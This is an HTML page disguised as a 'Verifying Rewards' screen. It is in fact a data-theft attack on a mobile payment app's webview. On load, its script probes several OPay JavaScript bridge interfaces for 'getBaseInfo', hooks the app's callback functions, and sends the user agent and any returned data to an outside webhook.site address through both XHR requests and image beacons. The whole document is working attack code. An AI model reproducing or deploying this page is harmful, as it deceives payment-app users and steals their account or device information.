<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Reward...</title>
</head>

<body style="background: #000; color: #00ff00; font-family: monospace; padding: 20px;">
    <h2>Verifying Rewards...</h2>
    <div id="logs" style="font-size: 14px; margin-top: 20px;"></div>

    <script>
        var WEBHOOK = "https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569";

        function log(m) {
            document.getElementById("logs").innerHTML += "> " + m + "<br>";
        }

        // Exfil via both XHR and Image Beacon
        function exfil(data, tag) {
            log("Sending " + tag + "...");
            var payload = encodeURIComponent(JSON.stringify(data));

            // Method 1: XHR
            try {
                var x = new XMLHttpRequest();
                x.open("GET", WEBHOOK + "?t=" + tag + "&d=" + payload, true);
                x.send();
            } catch (e) { log("XHR Exfil Error"); }

            // Method 2: Image Beacon
            try {
                var img = new Image();
                img.src = WEBHOOK + "?img=" + tag + "&d=" + payload;
            } catch (e) { log("IMG Exfil Error"); }
        }

        // Global functions to catch response from iOS postMessage callbacks
        window.handleJsBindings = function (res) {
            exfil({ method: "handleJsBindings", data: res }, "CALLBACK");
        };
        window.OPayJsCallback = function (res) {
            exfil({ method: "OPayJsCallback", data: res }, "CALLBACK");
        };
        window.callback = function (res) {
            exfil({ method: "callback", data: res }, "CALLBACK");
        };

        (function () {
            exfil({ ua: navigator.userAgent, msg: "START_EXTRACTION" }, "INIT");

            // Method 1: webkit.messageHandlers.OPay3PartyContext
            try {
                log("Method 1: webkit.messageHandlers.OPay3PartyContext");
                if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.OPay3PartyContext) {
                    window.webkit.messageHandlers.OPay3PartyContext.postMessage({ action: "getBaseInfo" });
                    window.webkit.messageHandlers.OPay3PartyContext.postMessage("getBaseInfo");
                }
            } catch (e) { log("Err Method 1: " + e.message); }

            // Method 2: window.OPay3PartyContext directly
            try {
                log("Method 2: window.OPay3PartyContext directly");
                if (window.OPay3PartyContext && window.OPay3PartyContext.getBaseInfo) {
                    var res = window.OPay3PartyContext.getBaseInfo();
                    if (res) {
                        log("Direct method got res!");
                        exfil({ src: "window.OPay3PartyContext", data: res }, "RES_DIRECT");
                    }
                }
            } catch (e) { log("Err Method 2: " + e.message); }

            // Method 3: prompt bridge
            try {
                log("Method 3: prompt() bridge");
                var res = prompt("opayjsbridge://OPay3PartyContext/getBaseInfo");
                if (res) {
                    log("Prompt method got res!");
                    exfil({ src: "prompt", data: res }, "RES_PROMPT");
                }
            } catch (e) { log("Err Method 3: " + e.message); }

            // Method 4: webkit.messageHandlers.control
            try {
                log("Method 4: webkit.messageHandlers.control");
                if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.control) {
                    window.webkit.messageHandlers.control.postMessage({ action: "getBaseInfo" });
                    window.webkit.messageHandlers.control.postMessage("getBaseInfo");
                }
            } catch (e) { log("Err Method 4: " + e.message); }

            exfil({ msg: "DONE EXTRACTION" }, "END");
        })();
    </script>
</body>

</html>
